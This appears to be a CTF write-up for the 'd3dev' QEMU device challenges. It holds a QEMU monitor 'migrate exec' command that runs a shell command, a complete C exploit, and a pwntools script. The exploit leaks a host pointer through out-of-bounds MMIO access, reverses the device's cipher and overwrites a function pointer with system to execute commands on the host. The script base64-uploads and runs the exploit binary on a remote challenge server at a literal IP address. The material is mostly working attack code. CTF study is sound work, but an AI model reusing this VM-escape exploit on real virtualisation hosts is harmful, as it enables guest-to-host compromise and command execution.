# d3dev 
As there is a open monitor in remote, we can Use Ctrl-A + C into monitor, then:
```
migrate "exec: cat flag 1>&2"
```
# d3dev-revenge
```
#include <stdio.h>
#include<stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/io.h>

#define   PMIO_BASE        0xC040
#define   PMIO_PORT(PORT)  (PORT + PMIO_BASE)

int       mmio_fd;
uint64_t* mmio_mem;

uint64_t mmio_read(uint64_t index)
{
    return mmio_mem[index];
}

void mmio_write(uint64_t index, uint64_t value)
{
    mmio_mem[index] = value;
}

uint32_t pmio_read(uint32_t port)
{
    return inl(PMIO_PORT(port));
}

void pmio_write(uint32_t port, uint32_t value)
{
    outl(value,PMIO_PORT(port));
}

void mem_init(){
    mmio_fd=open("/sys/devices/pci0000:00/0000:00:03.0/resource0",O_RDWR|O_SYNC);
    if(mmio_fd == -1){
        printf("[-] Open device's resource0 failed\n");
        exit(-1);
    }
    mmio_mem = mmap(0,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,mmio_fd, 0);
    printf("[+] Device MMAP at %p\n",mmio_mem);
}

void decrypt(unsigned int *A){
	int j;
	unsigned int v12 = A[0],v13 = A[1],sum = 0,v7 = 0;
     do
      {
        v7 -= 0x61C88647;
        v12 += (v7 + v13) ^ (((unsigned int)v13 >> 5)) ^ (16 * v13);
        v13 = ((v7 + v12) ^ ((v12 >> 5)) ^ (16 * v12)) + v13;
      }
      while ( v7 != 0xC6EF3720 );
	A[0] = v12;
	A[1] = v13;
}

void encrypt(unsigned int *A){
	int j;
	unsigned int result = A[1],v5 = A[0],sum = 0,v4 = 0;
v4 = 0xC6EF3720;
 do
 
  {
    result = result - ((v5 + v4) ^ ((v5 >> 5)) ^ (16 * v5));
    v5 -= (result + v4) ^ (((unsigned int)result >> 5)) ^ (16 * result);
    v4 += 0x61C88647;
  }while(v4);
	A[1] = result;
	A[0] = v5;
}

int main()
{   
    if( iopl(3)!=0 ){
        printf("[-] Set I/O permission failed\n");
        exit(-1);
    }
    mem_init();
    pmio_write(8,0x100);
    pmio_write(4,0);
    uint64_t addr=mmio_read(((0x12f0-0xad8)/8-256));
        printf("[+] Leaked: %llx\n",addr);
    decrypt(&addr);
    printf("[+] Leaked: %llx\n",addr);
    uint64_t system=addr-0x04aeb0+0x055410;
    char *cmd="cat ./flag\x00";
    uint64_t final=*(uint64_t *)cmd;
    uint64_t final2=*(uint64_t *)(cmd+8);   
    encrypt(&final);
    encrypt(&final2);
    pmio_write(8,0);
    mmio_write(0,final); 
    mmio_write(1,final2); 
    pmio_write(8,0x100); 
    char *tmp=mmio_mem;
    tmp+=((0x12f0-0xad8)/8-256)*8;
    encrypt(&system);
    *(uint64_t *)(tmp)=system;
    pmio_write(28,0x20202020);  
}
```

# Tips:
upload.py (three ways):
```
#coding:utf-8
from pwn import *
import commands
import base64
import sys
import os

context.log_level = 'debug'

def upload():
   with open("exp.zip", "rb") as f:
       data = f.read()
   encoded = base64.b64encode(data)
   for i in range(0, len(encoded), 300):
       #print("%d / %d" % (i, len(encoded)))
       print("echo \"%s\" >> benc" % (encoded[i:i+300]))        
   print("cat benc | base64 -d > exp.zip")    
   print("unzip ./exp.zip")
   print("chmod +x ./exp")
   print("./exp")

def exec_cmd(cmd):
    r.sendline(cmd)
    r.recvuntil("/ # ")

def upload():
    p = log.progress("Upload")
    with open("exp.zip","rb") as f:
        data = f.read()
        encoded = base64.b64encode(data)
        r.recvuntil("/ # ")
        for i in range(0,len(encoded),300):
                p.status("%d / %d" % (i,len(encoded)))
                exec_cmd("echo \"%s\" >> benc" % (encoded[i:i+300]))
        log.success("success")



context.log_level = 'debug'
cmd = '#'

def exploit(r):
    r.sendlineafter(cmd, 'stty -echo')
    os.system('gzip -c 1 > my_exp.gz')
    r.sendlineafter(cmd, 'cat <<EOF > my_exp.gz.b64') #heredoc
    r.sendline((read('my_exp.gz')).encode('base64'))
    r.sendline('EOF')
    r.sendlineafter(cmd, 'base64 -d my_exp.gz.b64 > my_exp.gz')
    r.sendlineafter(cmd, 'gunzip my_exp.gz')
    r.sendlineafter(cmd, 'chmod +x ./my_exp') 
    r.sendlineafter(cmd, './my_exp') 
    r.sendlineafter(cmd, 'cat flag') 
    r.interactive()
    
exploit(remote('106.14.216.214 ', 52295))
```